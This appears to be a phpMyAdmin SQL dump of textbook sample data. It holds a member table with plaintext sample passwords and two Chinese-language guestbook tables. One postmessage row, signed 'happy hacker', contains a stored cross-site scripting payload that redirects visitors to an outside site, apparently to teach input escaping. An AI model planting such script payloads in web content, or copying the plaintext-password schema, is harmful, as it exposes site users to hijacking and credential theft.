-- phpMyAdmin SQL Dump
-- version 2.10.3
-- http://www.phpmyadmin.net
-- 
-- 主機: localhost
-- 建立日期: Jun 01, 2010, 01:28 PM
-- 伺服器版本: 5.0.51
-- PHP 版本: 5.2.6

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";

-- 
-- 資料庫: `ch25`
-- 

-- --------------------------------------------------------

-- 
-- 資料表格式： `member`
-- 

CREATE TABLE `member` (
  `id` int(4) NOT NULL auto_increment,
  `username` varchar(12) NOT NULL default '',
  `password` varchar(12) NOT NULL default '',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=big5 COMMENT='會員資料' AUTO_INCREMENT=10 ;

-- 
-- 列出以下資料庫的數據： `member`
-- 

INSERT INTO `member` VALUES (2, 'andy', 'a123456');
INSERT INTO `member` VALUES (3, 'bob', 'b123456');
INSERT INTO `member` VALUES (4, 'cindy', 'c123456');
INSERT INTO `member` VALUES (5, 'mary', 'm123456');
INSERT INTO `member` VALUES (6, 'david', 'd123456');
INSERT INTO `member` VALUES (7, 'jane', 'j123456');
INSERT INTO `member` VALUES (8, 'kim', 'k123456');
INSERT INTO `member` VALUES (9, 'sam', 's123456');
INSERT INTO `member` VALUES (1, 'daniel', '123456');

-- --------------------------------------------------------

-- 
-- 資料表格式： `postcomment`
-- 

CREATE TABLE `postcomment` (
  `id` int(11) NOT NULL auto_increment,
  `subject` varchar(60) character set utf8 collate utf8_unicode_ci NOT NULL,
  `name` varchar(40) character set utf8 collate utf8_unicode_ci NOT NULL,
  `email` varchar(25) character set utf8 collate utf8_unicode_ci NOT NULL,
  `comment` mediumtext character set utf8 collate utf8_unicode_ci NOT NULL,
  `postdate` datetime NOT NULL default '0000-00-00 00:00:00',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=big5 COMMENT='使用者的留言' AUTO_INCREMENT=15 ;

-- 
-- 列出以下資料庫的數據： `postcomment`
-- 

INSERT INTO `postcomment` VALUES (3, '歡迎來台東七逃', '住在台東的人', 'sam@somesite.com', '台東的東海岸的部分為台十一線，沿路有很多的景點可以遊玩。例如小野柳，樽海岸，三仙台，水往上流等…。\r\n而且東海岸的風景真的很漂亮，很值得一走。', '2010-06-01 18:22:39');
INSERT INTO `postcomment` VALUES (1, '尚未收到訂購商品', '李英明', 'sam@example.com', '您好:\r\n\r\n我在上星期訂購貴站的『網頁程式設計師』書籍，到目前為止還沒有收到。請幫我查一查，是不是已經寄出來了。\r\n\r\n                                李英明', '2010-06-01 18:20:11');
INSERT INTO `postcomment` VALUES (2, '如果要學 PHP + MySQL可以參考那一本書?', '大頭', 'andy@somewhere.com', '德瑞工作室的 "Dreamweaver CS3 + PHP 網頁資料庫範例教學 - AJAX+CSS" 是一本很不錯的書籍。不僅提供入門的基本知識，而且有完整的實例應用。\r\n書裡面使用精彩的圖例來講解，而不是只有枯燥的文字而已。選擇這本書絕對沒錯。', '2010-06-01 18:21:28');

-- --------------------------------------------------------

-- 
-- 資料表格式： `postmessage`
-- 

CREATE TABLE `postmessage` (
  `id` int(11) NOT NULL auto_increment,
  `subject` varchar(60) character set utf8 collate utf8_unicode_ci NOT NULL,
  `name` varchar(40) character set utf8 collate utf8_unicode_ci NOT NULL,
  `email` varchar(25) character set utf8 collate utf8_unicode_ci NOT NULL,
  `question` mediumtext character set utf8 collate utf8_unicode_ci NOT NULL,
  `postdate` datetime NOT NULL default '0000-00-00 00:00:00',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=big5 COMMENT='使用者的留言' AUTO_INCREMENT=84 ;

-- 
-- 列出以下資料庫的數據： `postmessage`
-- 

INSERT INTO `postmessage` VALUES (1, '尚未收到訂購商品', '李英明', 'sam@example.com', '您好:\r\n\r\n我在上星期訂購貴站的『網頁程式設計師』書籍，到目前為止還沒有收到。請幫我查一查，是不是已經寄出來了。\r\n\r\n                                李英明  敬上', '2010-06-01 12:58:56');
INSERT INTO `postmessage` VALUES (2, '讓您轉移網址', '快樂駭客', '不知道', '<script>location.href="http://www.kingsinfo.com.tw";</script>', '2010-06-01 13:01:52');
